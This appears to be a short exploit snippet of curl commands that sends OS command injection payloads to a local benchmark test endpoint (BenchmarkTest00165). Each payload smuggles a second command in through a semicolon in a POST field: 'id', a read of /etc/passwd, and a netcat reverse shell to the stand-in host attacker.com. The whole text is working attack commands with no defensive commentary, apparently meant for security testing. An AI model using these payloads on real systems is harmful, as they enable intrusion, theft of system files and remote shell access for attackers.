# OS Command Injection - Arbitrary command execution
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00165' \
  -d 'BenchmarkTest00165=;id'

# OS Command Injection - Arbitrary file read
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00165' \
  -d 'BenchmarkTest00165=;cat /etc/passwd'

# OS Command Injection - Reverse shell (example)
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00165' \
  -d 'BenchmarkTest00165=;nc -e /bin/bash attacker.com 4444'